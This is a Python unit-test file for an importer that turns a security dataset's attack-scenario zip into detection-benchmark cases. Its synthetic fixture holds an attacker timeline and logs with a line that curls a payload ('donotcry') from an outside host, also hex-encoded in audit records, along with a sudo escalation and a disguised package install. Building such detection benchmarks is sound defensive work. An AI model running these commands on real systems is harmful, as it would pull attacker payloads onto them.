"""Synthetic unit tests for `benchmark_import_camlds.py`."""
import binascii
import json
from pathlib import Path
import tempfile
import unittest
import zipfile

from benchmark_contracts import load_json, validate_coverage, validate_public_bundle, validate_scenario, validate_truth
from benchmark_import_camlds import DEFAULT_COVERAGE, import_camlds_case


class CamLdsImporterTests(unittest.TestCase):

    def _build_zip(self, root):
        zp = root / 'scenario_3_ssh_apt.zip'
        sudo_hex = binascii.hexlify(b'sudo\x00-i').decode('ascii').upper()
        curl_hex = binascii.hexlify(b'curl\x00http://192.42.1.174/donotcry').decode('ascii').upper()
        with zipfile.ZipFile(zp, 'w', compression=zipfile.ZIP_DEFLATED) as zf:
            # Must be skipped!
            zf.writestr(
                'scenario_3_ssh_apt/reposerver/configs/ssh/ssh_host_rsa_key',
                '-----BEGIN ' + 'OPENSSH PRIVATE KEY-----\nSECRET_KEY_MATERIAL\n-----END OPENSSH PRIVATE KEY-----\n',
            )
            # Attacker timeline (JSONL)
            am_rows = [
                {
                    'start-datetime': '2025-12-12T10:28:43.000000',
                    'type': 'ssh',
                    'cmd': 'id',
                    'parameters': {'session': 'foothold', 'metadata': {'techniques': 'T1078.002'}},
                },
                {
                    'start-datetime': '2025-12-12T10:29:50.000000',
                    'type': 'ssh',
                    'cmd': 'sudo -i',
                    'parameters': {'session': 'foothold', 'metadata': {'techniques': 'T1078.003'}},
                },
                {
                    'start-datetime': '2025-12-12T10:38:51.000000',
                    'type': 'ssh',
                    'cmd': 'dpkg-deb healthcheckd',
                    'parameters': {'session': 'foothold', 'metadata': {'techniques': 'T1072'}},
                },
                {
                    'start-datetime': '2025-12-12T10:47:18.000000',
                    'type': 'msf-session',
                    'cmd': 'curl http://192.42.1.174/donotcry',
                    'parameters': {'session': 'movement', 'metadata': {'techniques': 'T1105'}},
                },
                {
                    'start-datetime': '2025-12-12T10:47:20.000000',
                    'type': 'msf-session',
                    'cmd': 'unlogged_custom_binary_xyz',
                    'parameters': {'session': 'movement', 'metadata': {'techniques': 'T1059.004'}},
                },
            ]
            zf.writestr(
                'scenario_3_ssh_apt/attacker/attackmate.json',
                '\n'.join(json.dumps(r) for r in am_rows) + '\n',
            )
            # Pre-attack benign syslog/auth lines (10:20Z) + attack lines
            zf.writestr(
                'scenario_3_ssh_apt/reposerver/logs/log/auth.log',
                'Dec 12 10:20:05 puppet cron[101]: session opened for user root\n'
                'Dec 12 10:28:44 puppet sshd[202]: Accepted password for admin from 10.12.0.223 port 44112 ssh2\n'
                'Dec 12 10:29:52 puppet sshd[209]: Accepted password for backup from 10.12.0.99 port 51200 ssh2\n',
            )
            sudo_unrelated_hex = binascii.hexlify(b'sudo\x00/usr/bin/id').decode('ascii').upper()
            zf.writestr(
                'scenario_3_ssh_apt/reposerver/logs/log/audit/audit.log',
                'type=SYSCALL msg=audit(1765535390.500:100): exe="/usr/bin/sudo" UID="backup"\n'
                'type=PROCTITLE msg=audit(1765535390.500:100): proctitle=' + sudo_unrelated_hex + '\n'
                'type=SYSCALL msg=audit(1765535391.100:101): exe="/usr/bin/sudo" UID="admin"\n'
                'type=PROCTITLE msg=audit(1765535391.100:101): proctitle=' + sudo_hex + '\n',
            )
            zf.writestr(
                'scenario_3_ssh_apt/linuxshare/logs/log/dpkg.log',
                '2025-12-12 10:41:03 status installed healthcheckd:amd64 1.0-2\n',
            )
            zf.writestr(
                'scenario_3_ssh_apt/linuxshare/logs/log/audit/audit.log',
                'type=PROCTITLE msg=audit(1765536439.200:205): proctitle=' + curl_hex + '\n'
                'type=SYSCALL msg=audit(1765536439.200:205): exe="/usr/bin/curl" UID="root"\n',
            )
        return zp

    def test_imports_s4_apt_and_s0_pre_attack_control_and_skips_private_keys(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            zp = self._build_zip(root)

            rep_apt = import_camlds_case(zp, root / 'apt_out', ioc_regime='novel_apt_zero_ioc')
            self.assertEqual(rep_apt['sophistication_band'], 'S4')
            self.assertGreaterEqual(rep_apt['steps'], 3)
            apt_truth = load_json(Path(rep_apt['case_dir']) / 'evaluator' / 'truth.json')
            self.assertNotIn('T1059.004', {s['technique_id'] for s in apt_truth['steps']})
            sudo_steps = [s for s in apt_truth['steps'] if s['technique_id'] == 'T1078.003']
            self.assertEqual(len(sudo_steps), 1)
            self.assertEqual(len(sudo_steps[0]['support_sets']), 1)
            pub_text = (Path(rep_apt['case_dir']) / 'public' / 'evidence.json').read_text(encoding='utf-8')
            self.assertNotIn('SECRET_KEY_MATERIAL', pub_text)
            self.assertNotIn('OPENSSH PRIVATE KEY', pub_text)
            self.assertNotIn('cam-lds', pub_text.lower())
            self.assertNotIn('puppet', pub_text.lower())
            self.assertNotIn('reposerver', pub_text.lower())
            self.assertIn('donotcry', pub_text)

            rep_ctrl = import_camlds_case(zp, root / 'ctrl_out', control_pre_attack=True, ioc_regime='novel_apt_zero_ioc')
            self.assertEqual(rep_ctrl['sophistication_band'], 'S0')
            self.assertEqual(rep_ctrl['steps'], 0)

            cov = validate_coverage(load_json(DEFAULT_COVERAGE))
            for rep in (rep_apt, rep_ctrl):
                cdir = Path(rep['case_dir'])
                ev = validate_public_bundle(load_json(cdir / 'public' / 'evidence.json'), root=cdir / 'public')
                validate_scenario(load_json(cdir / 'scenario.json'), cov)
                validate_truth(load_json(cdir / 'evaluator' / 'truth.json'), ev)


if __name__ == '__main__':
    unittest.main()
